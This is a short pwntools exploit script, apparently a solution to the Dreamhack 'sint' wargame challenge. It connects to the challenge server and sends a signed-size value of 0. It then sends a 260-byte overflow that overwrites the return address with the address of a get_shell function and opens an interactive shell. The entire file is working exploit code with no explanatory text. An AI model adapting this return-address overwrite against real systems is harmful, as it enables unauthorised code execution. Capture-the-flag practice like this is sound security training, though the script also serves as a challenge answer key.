from pwn import *

# p = process("./sint")

# nc host3.dreamhack.games 14275
p = remote("host3.dreamhack.games", 14275)
get_shell = 0x8048659

p.recvuntil(": ")
p.sendline("0")

pay = b""
pay += b"A" * 256
pay += b"B" * 4
pay += p32(get_shell)

p.recvuntil(": ")
p.send(pay)

p.interactive()